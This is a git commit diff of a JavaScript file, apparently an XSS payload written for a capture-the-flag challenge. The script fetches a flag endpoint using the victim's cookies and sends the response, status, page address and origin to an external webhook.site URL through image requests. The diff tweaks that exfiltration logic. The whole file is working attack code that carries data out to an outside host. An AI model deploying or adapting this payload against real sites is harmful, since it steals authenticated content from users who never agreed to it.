883959390d1918d7005cd9f13e02c5042547dcd7
Kursat Yanik <alikursadyanik@gmail.com>
2026-03-21 02:33:46 +0300

    move test.js to public2

--- public/test.js
+++ public/test.js
@@ -1,23 +1,22 @@
 (async () => {
   const hook = 'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde';
-
   const send = (key, value) => {
     new Image().src = hook + '?' + key + '=' + encodeURIComponent(value);
   };
 
   try {
-    const target = location.origin + '/xss-two-flag';
-    const res = await fetch(target, {
-      credentials: 'include'
+    const res = await fetch('/xss-two-flag', {
+      credentials: 'include',
+      mode: 'same-origin'
     });
 
     const text = await res.text();
 
-    send('origin', location.origin);
     send('status', String(res.status));
     send('flag', text);
   } catch (e) {
-    send('origin', location.origin);
     send('err', String(e));
+    send('href', location.href);
+    send('origin', location.origin);
   }
 })();
